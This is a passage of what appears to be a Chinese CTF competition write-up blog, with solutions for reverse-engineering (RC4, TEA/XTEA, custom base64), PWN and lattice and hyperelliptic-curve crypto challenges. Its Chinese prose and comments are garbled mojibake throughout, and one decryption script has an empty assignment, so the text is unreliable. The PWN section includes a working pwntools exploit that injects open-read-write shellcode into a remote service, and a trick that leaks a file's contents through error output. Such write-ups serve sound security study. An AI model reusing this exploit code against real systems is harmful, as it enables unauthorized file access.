size_t i; // [esp+1Ch] [ebp-Ch] for ( i = 0; i &lt; strlen(Str); ++i ) &#123; if ( Str[i] &lt;= 64 || Str[i] &gt; 90 ) &#123; if ( Str[i] &gt; 96 &amp;&amp; Str[i] &lt;= 122 ) Str[i] = (Str[i] - 97 + 3) % 26 + 97; //96&lt;å­—ç¬¦asciiå€¼&lt;=122ï¼Œå­—ç¬¦å¾ªç¯ç§»ä½ &#125; else &#123; Str[i] = (Str[i] - 65 + 3) % 26 + 65; //64&lt;å­—ç¬¦asciiå€¼&lt;=90ï¼Œå­—ç¬¦å¾ªç¯ç§»ä½ &#125; &#125; return Str;&#125; å°† v8 å­—ç¬¦ä¸²å…ˆæŒ‰å‡½æ•° sub_401746()è¿˜åŸï¼Œå†æŒ‰å‡½æ•° sub_40167D()è¿˜åŸï¼š 123456789101112131415161718192021222324252627282930313233343536s=&#x27;WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc&#x27;s=list(s.encode())t=[-1]*len(s)tt=[-1]*len(s)for i in range(len(s)): for j in range(32,128): c=j if c&lt;=64 or c&gt;90: if c&gt;96 and c&lt;=122: c=(c-97+3)%26+97 else: c=(c-65+3)%26+65 if c==s[i]: t[i]=j break for i in range(len(t)): for j in range(32,128): c=j if c&lt;=64 or c&gt;90: if c&lt;=96 or c&gt;122: c=c else: c-=32 else: c+=32 if c==t[i]: tt[i]=j break print(bytes(tt))#è§£å¯†å¾—å¯†æ–‡ï¼štCvB2hvXuS77mvZQytf5wwfKzRZezvZUmweMxSN71BZJyub54wfZ#è‡ªå®šä¹‰ç è¡¨ï¼ša-z0-9A-Z+/= è§£è‡ªå®šä¹‰ç è¡¨ä¸‹çš„base64å¾—flagã€‚ â€‹ ez Do you like basketball? IDAï¼Œmain()ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081sub_40E3F0();puts(&quot;Do you like basketball?&quot;);scanf(&quot;%s&quot;, Source); //è¾“å…¥å­—ç¬¦ä¸²Sourcestrcpy(Destination, Source); //Dest = Sourcememset(v7, 0, sizeof(v7));memset(v8, 0, 0x80u);sub_40235D(Source, v7, &quot;flag&#123;Would_you_like_basketball?&#125;&quot;); //å‡½æ•°sub_40235D(Source,out,key) ï¼ˆRC4+base64ï¼‰v28 = 32;v24[0] = 2;v24[1] = 2;v24[2] = 3;v24[3] = 4; //v24 = [2,2,3,4]puts(&quot;please input your lucky number&quot;);for ( i = 0; i &lt;= 1; ++i ) scanf(&quot;%d&quot;, &amp;v25 + i); //è¾“å…¥v25,v26for ( j = 0; j &lt;= 1; ++j ) scanf(&quot;%d&quot;, &amp;v22 + j); //è¾“å…¥v22,v23for ( k = 0; k &lt;= 1; ++k ) scanf(&quot;%d&quot;, &amp;v20 + k); //è¾“å…¥v20,v21for ( l = 0; l &lt;= 1; ++l ) scanf(&quot;%d&quot;, &amp;v18 + l); //è¾“å…¥v18,v19v4[0] = v25;v4[1] = v26;v4[2] = v22;v4[3] = v23;v4[4] = v20;v4[5] = v21;v4[6] = v18;v4[7] = v19; //v4 = [v25,v26,v22,v23,v20,v21,v18,v19]for ( m = 0; m &lt;= 7; ++m ) //å¯¹v4å†’æ³¡æ’åºï¼ˆå‡åºï¼‰&#123; for ( n = 7; n &gt; m; --n ) &#123; if ( v4[n] &lt; v4[n - 1] ) &#123; v27 = v4[n]; v4[n] = v4[n - 1]; v4[n - 1] = v27; &#125; &#125;&#125;sub_40152F(&amp;v25, v24); //å‡½æ•°sub_40152F() ï¼ˆTEAåŠ å¯†ï¼‰sub_40152F(&amp;v22, v24); //å‡½æ•°sub_40152F() ï¼ˆTEAåŠ å¯†ï¼‰sub_4015FD(v28, &amp;v20, v24); //å‡½æ•°sub_4015FD() ï¼ˆXTEAåŠ å¯†ï¼‰sub_4015FD(v28, &amp;v18, v24); //å‡½æ•°sub_4015FD() ï¼ˆXTEAåŠ å¯†ï¼‰memset(v9, 0, sizeof(v9));v9[0] = 81; //v9v9[1] = 116;......v9[46] = 7;v9[47] = 8;v16 = -1621115832; //v10~v17ï¼Œ8ä¸ªhexv17 = -984516975;v14 = 616429839;v15 = 807110888;v12 = -1837822886;v13 = -1596355058;v10 = -1915738221;v11 = 1331005540;if ( v25 != -1621115832 //v25,v26,v22,v23,v20,v21,v18,v19 == v10~v17 || v26 != v17 || v14 != v22 || v15 != v23 || v12 != v20 || v13 != v21 || v10 != v18 || v11 != v19 )&#123; printf(&quot;you are wrong&quot;); exit(0);&#125;for ( ii = 0; ii &lt;= 47; ++ii ) *(_DWORD *)&amp;v8[4 * ii + 128] = v4[ii % 8] ^ v7[ii]; //v8 = v4^v7 for ( jj = 0; jj &lt;= 47; ++jj )&#123; if ( v9[jj] != *(_DWORD *)&amp;v8[4 * jj + 128] ) //v9 == v8ï¼Ÿ exit(0);&#125;printf(&quot;Right,FLAG is Neepu&#123;%s&#125;\\n&quot;, Destination);system(&quot;PAUSE&quot;);return 0; å‡½æ•° sub_40235D(Source,out,key)ï¼š 123456789101112131415161718192021222324252627282930void __cdecl sub_40235D(char *Str, void *a2, char *a3)&#123; void *Src; // [esp+1Ch] [ebp-1Ch] BYREF size_t Size; // [esp+20h] [ebp-18h] BYREF void *Block; // [esp+24h] [ebp-14h] size_t v6; // [esp+28h] [ebp-10h] size_t v7; // [esp+2Ch] [ebp-Ch] if ( Str &amp;&amp; a2 &amp;&amp; a3 ) &#123; v7 = strlen(Str); v6 = strlen(a3); Block = (void *)sub_418710(v7 + 1); //åˆå§‹åŒ–Block memcpy(Block, Str, v7 + 1); sub_401E22(Block, v7, a3, v6); //RC4åŠ å¯†ï¼ŒBlock = RC4(Str,key) Size = 0; Src = 0; sub_4020DE(Block, v7, (int)&amp;Src, (int)&amp;Size); //Src = Blockçš„base64ç¼–ç ï¼ˆè‡ªå®šä¹‰ç è¡¨ï¼‰ if ( Src ) &#123; memcpy(a2, Src, Size); //a2 = Src *((_BYTE *)a2 + Size) = 0; if ( Src ) j_j_free(Src); Src = 0; &#125; if ( Block ) j_j_free(Block); &#125;&#125; å‡½æ•° sub_40152F()ï¼š 12345678910111213141516171819202122unsigned int __cdecl sub_40152F(unsigned int *a1, _DWORD *a2) //TEAåŠ å¯†ç®—æ³•&#123; unsigned int result; // eax unsigned int i; // [esp+20h] [ebp-10h] int v4; // [esp+24h] [ebp-Ch] unsigned int v5; // [esp+28h] [ebp-8h] unsigned int v6; // [esp+2Ch] [ebp-4h] v6 = *a1; v5 = a1[1]; v4 = 0; for ( i = 0; i &lt;= 0x1F; ++i ) &#123; v4 -= 1640531527; v6 += (v5 + v4) ^ (16 * v5 + *a2) ^ ((v5 &gt;&gt; 5) + a2[1]); v5 += (v6 + v4) ^ (16 * v6 + a2[2]) ^ ((v6 &gt;&gt; 5) + a2[3]); &#125; *a1 = v6; result = v5; a1[1] = v5; return result;&#125; å‡½æ•° sub_4015FD()ï¼š 12345678910111213141516171819202122unsigned int __cdecl sub_4015FD(unsigned int a1, unsigned int *a2, int a3) //XTEAç®—æ³•&#123; unsigned int result; // eax unsigned int v4; // [esp+10h] [ebp-10h] unsigned int v5; // [esp+14h] [ebp-Ch] unsigned int v6; // [esp+18h] [ebp-8h] unsigned int i; // [esp+1Ch] [ebp-4h] v6 = *a2; v5 = a2[1]; v4 = 0; for ( i = 0; i &lt; a1; ++i ) &#123; v6 += (((v5 &gt;&gt; 5) ^ (16 * v5)) + v5) ^ (*(_DWORD *)(4 * (v4 &amp; 3) + a3) + v4); v4 -= 1640531527; v5 += (((v6 &gt;&gt; 5) ^ (16 * v6)) + v6) ^ (*(_DWORD *)(4 * ((v4 &gt;&gt; 11) &amp; 3) + a3) + v4); &#125; *a2 = v6; result = v5; a2[1] = v5; return result;&#125; æ ¹æ®ä¸Šé¢é€»è¾‘ï¼Œå…ˆåˆ©ç”¨TEAå’ŒXTEAè§£å¯†ç®—æ³•ç”± v10~v17 è§£å¯†å¾—åˆ°åˆå§‹å€¼ v25,v26,v22,v23,v20,v21,v18,v19ï¼š 12345678910111213141516171819202122232425#TEAè§£å¯†def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0xC6EF3720 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: encrypted = key = [2, 2, 3, 4] decrypted = decrypt(encrypted, key) print(decrypted) 12345678910111213141516171819202122#XTEAè§£å¯†def decrypt(rounds, v, k): v0 = v[0] v1 = v[1] delta = 0x9E3779B9 x = delta * rounds for i in range(rounds): v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: encrypted = key = [2, 2, 3, 4] rounds = 32 decrypted = decrypt(rounds, encrypted, key) print(decrypted) ç»“æœï¼š 1234[0x9F5FBC48,0xC5517691] -&gt; [1,1][0x24BDF90F,0x301B88E8] -&gt; [3,4][0x92750C5A,0xA0D98E0E] -&gt; [2,5][0x8DD02793,0x4F558864] -&gt; [8,7] æ•… v4 = [1,1,2,3,4,5,7,8]ï¼Œåˆ v9 = v8 = v4^v7ï¼Œå¼‚æˆ–å¾—åˆ° v7ï¼Œå…ˆbase64è§£ç å†RC4è§£å¯†å¯å¾—è¾“å…¥çš„ Source å€¼ï¼Œå³ä¸ºflagã€‚ â€‹ PWNncc ç»å…¸nc! PWNé¢˜è¿æ¥æ–¹å¼: nc neepusec.club ç«¯å£ ls / å‘ç°ç›®å½•ä¸‹æœ‰ /flagï¼Œä½†æ²¡æœ‰ cat ç­‰å¸¸è§çš„æŸ¥çœ‹æ–‡ä»¶å†…å®¹å‘½ä»¤ã€‚ cd /bin è¿›åˆ° /bin ç›®å½•ä¸‹ï¼Œls å‘ç°ç›®å½•ä¸‹æœ‰ sh è„šæœ¬æ‰§è¡Œå‘½ä»¤ï¼Œç›´æ¥ sh /flag åˆ©ç”¨æŠ¥é”™æ³„éœ² /flag æ–‡ä»¶å†…å®¹ã€‚ â€‹ easy_shellcode easy shellcode? flagåœ¨./flag checksecå‘ç°æ— ä»»ä½•ä¿æŠ¤ï¼ŒIDAæŸ¥çœ‹ï¼š 1234567891011__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; void *buf; // [rsp+0h] [rbp-10h] sub_9C3(a1, a2, a3); buf = (void *)(int)mmap((void *)0x23330000, 0x1000uLL, 7, 34, -1, 0LL); puts(&quot;just learn orw&quot;); read(0, buf, 0x200uLL); ((void (*)(void))buf)(); return 0LL;&#125; å‡½æ•° sub_9C3(a1,a2,a3)ï¼š 12345678unsigned int sub_9C3()&#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); sub_8CA(); return alarm(0x3Cu);&#125; å‡½æ•° sub_8CA()ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061unsigned __int64 sub_8CA()&#123; __int16 v1; // [rsp+0h] [rbp-50h] BYREF __int16 *v2; // [rsp+8h] [rbp-48h] __int16 v3; // [rsp+10h] [rbp-40h] BYREF char v4; // [rsp+12h] [rbp-3Eh] char v5; // [rsp+13h] [rbp-3Dh] int v6; // [rsp+14h] [rbp-3Ch] __int16 v7; // [rsp+18h] [rbp-38h] char v8; // [rsp+1Ah] [rbp-36h] char v9; // [rsp+1Bh] [rbp-35h] int v10; // [rsp+1Ch] [rbp-34h] __int16 v11; // [rsp+20h] [rbp-30h] char v12; // [rsp+22h] [rbp-2Eh] char v13; // [rsp+23h] [rbp-2Dh] int v14; // [rsp+24h] [rbp-2Ch] __int16 v15; // [rsp+28h] [rbp-28h] char v16; // [rsp+2Ah] [rbp-26h] char v17; // [rsp+2Bh] [rbp-25h] int v18; // [rsp+2Ch] [rbp-24h] __int16 v19; // [rsp+30h] [rbp-20h] char v20; // [rsp+32h] [rbp-1Eh] char v21; // [rsp+33h] [rbp-1Dh] int v22; // [rsp+34h] [rbp-1Ch] __int16 v23; // [rsp+38h] [rbp-18h] char v24; // [rsp+3Ah] [rbp-16h] char v25; // [rsp+3Bh] [rbp-15h] int v26; // [rsp+3Ch] [rbp-14h] unsigned __int64 v27; // [rsp+48h] [rbp-8h] v27 = __readfsqword(0x28u); v3 = 32; v4 = 0; v5 = 0; v6 = 4; v7 = 21; v8 = 0; v9 = 2; v10 = -1073741762; v11 = 32; v12 = 0; v13 = 0; v14 = 0; v15 = 21; v16 = 0; v17 = 1; v18 = 59; v19 = 6; v20 = 0; v21 = 0; v22 = 0; v23 = 6; v24 = 0; v25 = 0; v26 = 2147418112; v1 = 6; v2 = &amp;v3; prctl(38, 1LL, 0LL, 0LL, 0LL); prctl(22, 2LL, &amp;v1); return __readfsqword(0x28u) ^ v27;&#125; åœ¨å‡½æ•° sub_8CA() å‘ç° prctl() å‡½æ•°ã€‚ prctlæ˜¯åŸºæœ¬çš„è¿›ç¨‹ç®¡ç†å‡½æ•°ï¼Œæœ€åŸå§‹çš„æ²™ç®±è§„åˆ™å°±æ˜¯é€šè¿‡prctlå‡½æ•°æ¥å®ç°çš„ï¼Œå®ƒå¯ä»¥å†³å®šæœ‰å“ªäº›ç³»ç»Ÿè°ƒç”¨å‡½æ•°å¯ä»¥è¢«è°ƒç”¨ï¼Œå“ªäº›ç³»ç»Ÿè°ƒç”¨å‡½æ•°ä¸èƒ½è¢«è°ƒç”¨ã€‚ æ²™ç®±(Sandbox)æ˜¯ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­çš„ä¸€ç§éš”ç¦»æœºåˆ¶ï¼Œå…¶ç›®çš„æ˜¯é™åˆ¶ä¸å¯ä¿¡è¿›ç¨‹å’Œä¸å¯ä¿¡ä»£ç çš„è®¿é—®æƒé™ã€‚seccompæ˜¯å†…æ ¸ä¸­çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œseccompå¯ä»¥åœ¨ç¨‹åºä¸­ç¦ç”¨æ‰ä¸€äº›ç³»ç»Ÿè°ƒç”¨æ¥è¾¾åˆ°ä¿æŠ¤ç³»ç»Ÿå®‰å…¨çš„ç›®çš„ï¼Œseccompè§„åˆ™çš„è®¾ç½®ï¼Œå¯ä»¥ä½¿ç”¨prctlå‡½æ•°å’Œseccompå‡½æ•°æ—ã€‚ ä½¿ç”¨ seccomp-tools dump ./pwn çœ‹ä¸‹å“ªäº›å‡½æ•°å¯ç”¨ï¼š å‘ç°åªè¦ä¸æ˜¯ execve() éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä½¿ç”¨ open-&gt;read-&gt;write è¿™æ ·çš„orwçš„æ–¹å¼è·å–flagã€‚ mmap() æŠŠä»0x23330000å¼€å§‹çš„åœ°å€ï¼Œå¤§å°ä¸º0x1000çš„é•¿åº¦ï¼Œæƒé™æ”¹ä¸ºå¯å†™å¯æ‰§è¡Œã€‚ æ‰€ä»¥åªéœ€è¦å†™å…¥orwç±»å‹çš„shellcodeï¼Œç„¶åè·³è½¬æ‰§è¡Œï¼š 12345678910from pwn import *context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;p = remote(&#x27;neepusec.club&#x27;, 18146)mmap = 0x23330000orw_payload = shellcraft.open(&#x27;./flag&#x27;) #æ‰“å¼€æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶orw_payload += shellcraft.read(3,mmap,0x50) #è¯»å–æ–‡ä»¶æ ‡è¯†ç¬¦æ˜¯3çš„æ–‡ä»¶0x50ä¸ªå­—èŠ‚å­˜æ”¾åˆ°mmapåˆ†é…çš„åœ°å€ç©ºé—´é‡Œorw_payload += shellcraft.write(1,mmap,0x50) #å°†mmapåœ°å€ä¸Šçš„å†…å®¹è¾“å‡º0x50ä¸ªå­—èŠ‚p.sendlineafter(&#x27;orw\\n&#x27;, asm(orw_payload))p.interactive()","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›","slug":"match-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›","date":"2021-05-09T10:20:01.000Z","updated":"2021-12-05T18:13:22.333Z","comments":true,"path":"2021/05/09/match-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›/","permalink":"https://lazzzaro.github.io/2021/05/09/match-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"â€‹ è¿™ä¸€å±Šçš„misc+cryptoä¹Ÿå¤ªå°‘äº†ï¼Œä¸€äºŒè¡€åŒé˜Ÿ+å‚ç›´ä¸Šåˆ†æ˜æ˜¾ã€‚ Miscç­¾åˆ°ä¸‹è½½é™„ä»¶EBCDIC.txtï¼Œæ ¹æ®æ–‡ä»¶åå’Œå†…å®¹ï¼ŒçŒœæµ‹ä¸ºæŸç§ç¼–ç æ–¹å¼ï¼Œæœç´¢çŸ¥ä¸ºEBCDICç¼–ç ï¼š EBCDICï¼ˆå¹¿ä¹‰äºŒè¿›åˆ¶ç¼–ç çš„åè¿›åˆ¶äº¤æ¢ç ï¼ŒExtended Binary Coded Decimal Interchange Codeï¼‰ï¼Œæ˜¯å­—æ¯æˆ–æ•°å­—å­—ç¬¦çš„äºŒè¿›åˆ¶ç¼–ç ï¼Œæ˜¯IBMä¸ºå®ƒçš„æ›´å¤§å‹çš„æ“ä½œç³»ç»Ÿè€Œå¼€å‘çš„ã€‚å®ƒæ˜¯ä¸ºIBMçš„S/390ä¸Šçš„IBMOS/390æ“ä½œç³»ç»Ÿä¸Šä½¿ç”¨çš„æ–‡æœ¬æ–‡ä»¶çš„ç¼–ç ï¼Œå¹¶ä¸”æ•°åƒä¸ªå…¬å¸ä¸ºå®ƒä»¬çš„é—ç•™åº”ç”¨ç¨‹åºå’Œæ•°æ®åº“ä½¿ç”¨è¿™ç§ç¼–ç ã€‚åœ¨ä¸€ä¸ªEBCDICçš„æ–‡ä»¶é‡Œï¼Œæ¯ä¸ªå­—æ¯æˆ–æ•°å­—å­—ç¬¦éƒ½è¢«è¡¨ç¤ºä¸ºä¸€ä¸ª8ä½çš„äºŒè¿›åˆ¶æ•°ï¼ˆä¸€ä¸ª0ã€1å­—ç¬¦ä¸²ï¼‰ã€‚256ä¸ªå¯èƒ½çš„å­—ç¬¦è¢«å®šä¹‰ï¼ˆå­—æ¯ï¼Œæ•°å­—å’Œä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼‰ã€‚IBMçš„ä¸ªäººè®¡ç®—æœºå’Œå·¥ä½œç«™æ“ä½œç³»ç»Ÿä¸ä½¿ç”¨å®ƒä»¬æ‰€æœ‰çš„EBCDICç¼–ç ã€‚ç›¸åçš„ï¼Œå®ƒä»¬ä½¿ç”¨æ–‡æœ¬çš„å·¥ä¸šæ ‡å‡†ç¼–ç ï¼ŒASCIIç ã€‚è½¬åŒ–ç¨‹åºå…è®¸ä¸åŒçš„æ“ä½œç³»ç»Ÿä»ä¸€ç§ç¼–ç åˆ°å¦ä¸€ç§ç¼–ç çš„è½¬åŒ–ã€‚ æ‰¾åˆ°åœ¨çº¿è§£ç ç½‘ç«™ï¼Œå°†16è¿›åˆ¶EBCDICç è§£ç ä¸º16è¿›åˆ¶ASCIIç ï¼Œå†è½¬ä¸ºå­—ç¬¦å¾—åˆ°flagã€‚ flagå€¼ï¼šflag{we1c0me_t0_redhat2021} â€‹ Cryptoprimegame 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python3from decimal import *import mathimport randomimport structfrom flag import flagassert (len(flag) == 48)msg1 = flag[:24]msg2 = flag[24:]primes = [2]for i in range(3, 90): f = True for j in primes: if i * i &lt; j: break if i % j == 0: f = False break if f: primes.append(i)getcontext().prec = 100keys = []for i in range(len(msg1)): keys.append(Decimal(primes[i]).ln())sum_ = Decimal(0.0)for i, c in enumerate(msg1): sum_ += c * Decimal(keys[i])ct = math.floor(sum_ * 2 ** 256)print(ct)sum_ = Decimal(0.0)for i, c in enumerate(msg2): sum_ += c * Decimal(keys[i])ct = math.floor(sum_ * 2 ** 256)print(ct)597952043660446249020184773232983974017780255881942379044454676980646417087515453425985475047781336789963300910446852783032712598571885345660550546372063410589918 ä»£ç é€»è¾‘ï¼š å°†48é•¿åº¦çš„flagåˆ†ä¸º24é•¿åº¦ä¸¤éƒ¨åˆ†ï¼Œç”Ÿæˆ90ä»¥å†…çš„ç´ æ•°åˆ—è¡¨primeså’Œå‰24ä¸ªç´ æ•°è‡ªç„¶å¯¹æ•°åˆ—è¡¨keysï¼Œåˆ†åˆ«æ±‚å‡ºflagä¸¤éƒ¨åˆ†çš„asciiå€¼ä¸keyå€¼ä¹˜ç§¯å’Œã€‚ å®¹æ˜“çœ‹å‡º $S=\\text{ct} \\cdot 2^{256}=\\sum\\limits_{i=1}^{24}\\Big(c_i \\cdot (\\text{key}_i \\cdot 2^{256})\\Big)=\\sum\\limits_{i=1}^{24}(c_i \\cdot k_i)$ å½¢å¼ç±»ä¼¼äº0-1èƒŒåŒ…åŠ å¯†é—®é¢˜ï¼Œå…¶ä¸­å…¬é’¥ $k_i$ ä¸å¯†æ–‡ $S$ å·²çŸ¥ï¼Œéœ€è§£å¯†å¾—æ˜æ–‡ $c_i \\in [0,128)$ã€‚ ç”±äºæ˜æ–‡æ•°é‡ä¸å¤§ï¼Œä¸”èƒŒåŒ…å¯†åº¦ $d = \\cfrac{n}{\\log_2(\\text{max}(k_i))} \\approx 0.0968$ï¼Œå¯é‡‡ç”¨ä½å¯†åº¦æ”»å‡»æ–¹æ³•ï¼ˆLagarias&amp;Odlyzkoç®—æ³• æˆ– CJLOSSç®—æ³•ï¼‰æ¢å¤æ˜æ–‡ï¼Œæ„é€ æ ¼ï¼š $\\left(\\begin {array}{c} b_0 \\newline b_1 \\newline \\vdots \\newline b_n \\newline b_{n+1} \\end{array} \\right) =\\left(\\begin {array}{c} 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; Nk_0 \\newline 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; Nk_1 \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; Nk_n \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; Nk_{n+1} \\end{array} \\right) $ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from itertools import combinationsfrom decimal import Decimal, getcontextimport randomimport structprimes = [2]for i in range(3, 100): f = True for j in primes: if i * i &lt; j: break if i % j == 0: f = False break if f: primes.append(i)getcontext().prec = int(100)keys = []for i in range(len(primes)): keys.append(int(Decimal(int(primes[i])).ln() * (2 ** 256)))n = len(keys)d = n / log(max(keys), 2)assert CDF(d) &lt; 0.9408M = Matrix.identity(n)last_row = [0 for x in keys]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)ct = &#x27;597952043660446249020184773232983974017780255881942379044454676980646417087515453&#x27;# ct = &#x27;425985475047781336789963300910446852783032712598571885345660550546372063410589918&#x27;last_col = keys[:]last_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.LLL()target = X[0][:-1]flag = [-k for k in target]print(bytes(flag).strip(b&#x27;\\x00&#x27;))#ç»“æœ#b&#x27;flag&#123;715c39c3-1b46-4c23-&#x27;#b&#x27;8006-27b43eba2446&#125;&#x27; flagå€¼ï¼šflag{715c39c3-1b46-4c23-8006-27b43eba2446} â€‹ hpcurve ä½ çš„æ•°å­¦å­¦çš„æ€ä¹ˆæ ·ï¼Ÿ 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env sageimport structfrom random import SystemRandomp = 10000000000000001119R.&lt;x&gt; = GF(p)[]y=xf = y + y^7C = HyperellipticCurve(f, 0)J = C.jacobian()es = [SystemRandom().randrange(p**3) for _ in range(3)]Ds = [J(C(x, min(f(x).sqrt(0,1)))) for x in (11,22,33)]q = []def clk(): global Ds,es Ds = [e*D for e,D in zip(es, Ds)] return Dsdef generate(): u,v = sum(clk()) rs = [u[i] for i in range(3)] + [v[i] for i in range(3)] assert 0 not in rs and 1 not in rs q = struct.pack(&#x27;&lt;&#x27;+&#x27;Q&#x27;*len(rs), *rs) return qflag = &quot;flag&#123;xxxxxxx&#125;&quot;text = &#x27;a&#x27;*20+flagt = &#x27;&#x27;keys = generate()leng = len(keys)i = 0for x in text: t += chr(ord(keys[i%leng])^^ord(x)) i+=1print t.encode(&#x27;hex&#x27;)66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5 ä»£ç é€»è¾‘ï¼š å¯†æ–‡ä¸ºflagä¸è¶…æ¤­åœ†æ›²çº¿ $y^2=x+x^7$ éšæœºç”Ÿæˆå€¼å¼‚æˆ–å¾—åˆ°ï¼Œç”±äºéƒ¨åˆ†æ˜æ–‡å·²çŸ¥ï¼Œé€šè¿‡éšæœºç”Ÿæˆå™¨(RNG)éƒ¨åˆ†çš„ä»£ç æ¢å¤å‰©ä½™å­—ç¬¦ã€‚ å¯¹äºåŸŸ $K$ï¼Œäºæ ¼ä¸º $g$ è¶…æ¤­åœ†æ›²çº¿åŸºæœ¬å½¢å¼æ˜¯ $C:y^2+h(x)y=f(x)$ï¼Œå…¶ä¸­ $h(x),f(x) \\in K[x]$ï¼ˆå¤šé¡¹å¼ç³»æ•°éƒ½åœ¨ $K$ ä¸Šï¼‰ï¼Œä¸” $\\deg(h(x)) \\leq g$ï¼Œ$\\deg(f(x))=2g+1$ã€‚ è¶…æ¤­åœ†æ›²çº¿å¯†ç ä½“åˆ¶æ˜¯å»ºç«‹åœ¨è¶…æ¤­åœ†æ›²çº¿çš„Jacobianç¾¤ä¸Šçš„ï¼Œæœ‰é™åŸŸä¸Šè¶…æ¤­åœ†æ›²çº¿çš„Jacobianç¾¤æ˜¯ä¸€ä¸ªæœ‰é™äº¤æ¢ç¾¤ï¼ŒJacobiané˜¶è®°ä¸º $J(C)$ã€‚å¯ä»¥åœ¨ $J(C)$ä¸­å®šä¹‰å½’çº¦é™¤å­çš„ä¸€ä¸ªåŠ æ³•è¿ç®— ã€‚ä½¿å¾— $J(C)$æˆä¸ºä¸€ä¸ªäº¤æ¢ç¾¤ï¼Œè¿™ä¸ªæœ‰é™äº¤æ¢ç¾¤æ˜¯è¶…æ¤­åœ†æ›²çº¿å¯†ç ä½“åˆ¶çš„åŸºç¡€ã€‚ æ¯ä¸ªå…ƒç´  $D \\in J(C)$ éƒ½å¯ä»¥å”¯ä¸€è¡¨ç¤ºä¸º $K[x]$ ä¸Šçš„ä¸€ä¸ªå¤šé¡¹å¼å…ƒç»„ $\\langle u(x),v(x) \\rangle$ï¼Œå¤šé¡¹å¼æ»¡è¶³ï¼š $u(x)$ æ˜¯é¦–ä¸€å¤šé¡¹å¼ $u(x)$ æ•´é™¤ $f(x)-h(x)v(x)-v^2(x)$ $\\deg(v(x)) \\lt \\deg(u(x)) \\lt g$ è¿™é‡Œ $h(x)=0,f(x)=x+x^7$ï¼ŒRNGéƒ¨åˆ†ç”Ÿæˆä¸‰ä¸ªéšæœºæ•° $e_1,e_2,e_3$ ä»¥åŠä¸‰ä¸ªå…ƒç´  $D_1,D_2,D_3 \\in J(C)$ï¼Œ RNGéƒ¨åˆ†è®¡ç®— $\\langle u(x),v(x) \\rangle=e_1D_1+e_2D_2+e_3D_3$ å¹¶å°†ç³»æ•°è½¬æ¢ä¸ºå­—èŠ‚ã€‚ ç»“åˆå·²çŸ¥çš„a*20+flagå…±24å­—èŠ‚ï¼Œå¯ä»¥æ¢å¤ $u(x)$ã€‚ å¯¹äº $v(x)$ï¼Œæ ¹æ® $D \\in J(C)$ çš„æ€§è´¨ï¼Œæœ‰ $f(x)-h(x)v(x)-v^2(x) \\equiv 0 \\pmod {u(x)}$ å¦‚æœ $x_i$ æ˜¯ $u(x)$ çš„æ ¹ï¼ˆ$K$ ä»£æ•°é—­åŒ…ä¸‹ï¼‰ï¼Œæœ‰ $f(x_i)-h(x_i)v(x_i)-v^2(x_i) = 0 \\Longrightarrow v^2(x_i)+h(x_i)v(x_i)=f(x_i)$ï¼Œ è¯´æ˜ $(x_i,v(x_i))$ æ˜¯ $C$ ä¸Šçš„ä¸€ä¸ªç‚¹ã€‚ åˆ $h(x_i)=0$ï¼Œåˆ™ $v^2(x_i)=f(x_i) \\Longrightarrow v(x_i) = \\pm \\sqrt{f(x_i)}$ã€‚ ç”±äº $u(x)$ 